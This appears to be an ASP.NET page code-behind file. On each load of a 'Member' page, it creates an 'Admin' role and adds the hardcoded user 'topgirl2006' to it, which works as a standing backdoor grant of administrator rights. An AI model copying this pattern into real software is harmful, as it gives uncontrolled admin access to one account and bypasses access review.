using System;
using System.Data;
using System.Configuration;
using System.Collections;
using System.Web;
using System.Web.Security;
using System.Web.UI;
using System.Web.UI.WebControls;
using System.Web.UI.WebControls.WebParts;
using System.Web.UI.HtmlControls;

public partial class Member : System.Web.UI.Page
{
    protected void Page_Load(object sender, EventArgs e)
    {
          if(!Roles.RoleExists("Admin")){
              Roles.CreateRole("Admin");
          }
          if (!Roles.IsUserInRole("topgirl2006", "Admin"))
          {
              Roles.AddUserToRole("topgirl2006", "Admin");
        }
    }
}
